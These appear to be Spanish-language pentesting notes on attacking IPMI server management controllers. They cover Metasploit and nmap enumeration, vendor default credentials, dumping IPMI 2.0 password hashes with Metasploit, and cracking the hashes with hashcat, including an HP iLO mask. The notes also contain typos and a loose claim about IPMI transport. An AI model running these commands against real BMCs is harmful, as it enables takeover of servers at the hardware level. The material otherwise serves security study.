**IPMI** (Intelligent Platform Management Interface) es un estándar que permite administrar y monitorear servidores a nivel hardware, incluso cuando el sistema esta apagado.

Utiliza un microcontrolado (BMC) integrado en la placa base que tiene su CPU, memoria, sistema...


Sirve para monitorizar, modificar la BIOS antes de encender el SO...

IPMI usa **UPD / 623**, es un protocolo propio y va por ssh o telnet en muchos casos. 

Si se compromete el BMC, tienes acceso a todo.

### Enumeración

```
nmap -sU -p 623 --script ipmi-version {IP}
```


o tambien podemos enumerar con metasploit:

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts {IP}
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
```
#### Credenciales por defecto:

| Producto   | Usuario       | Password                           |
| ---------- | ------------- | ---------------------------------- |
| Dell iDRAC | root          | calvin                             |
| Supermicro | ADMIN         | ADMIN                              |
| HP iLO     | Administrator | Password aleatorio de 8 caracteres |

### Vulnerabilidad en IMPI 2.0

Durante el proceso de autenticación, el servidor envia al cliente un hash *SHA1* y *MD5*. Esto significa que puedes pedir el hash de cualquier usuario antes de autenticar. 

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts {IP}
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE ipmi.txt
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

y al conseguir el archivo con los hashes podemos crackearlo con *Hashcat*:

```
hashcat -m 7300 ipmi.txt wordlist.txt
```

si el BMC es HP iLO:

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

